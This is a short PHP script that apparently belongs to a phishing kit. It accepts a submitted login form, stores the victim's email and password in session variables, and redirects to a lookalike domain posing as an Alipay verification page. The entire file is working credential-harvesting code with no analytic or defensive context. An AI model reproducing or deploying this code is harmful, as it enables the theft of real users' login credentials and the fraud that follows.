<?php

if($_SERVER['REQUEST_METHOD'] != "POST") {
    header("HTTP/1.0 403 Forbidden");
    print("Forbidden");
    exit();
}

session_start();
$_SESSION["pr"] = $pr = $_POST['hidCflag'];
$_SESSION["em"] = $em = $_POST['Email'];
$_SESSION["ps"] = $ps = $_POST['Passwd'];

if ($em =="" || $ps =="")    {
    header( "Location: ./");
}
 else {
    header( "Location: http://alipayverify.website/dispatch.php");
  }
?>
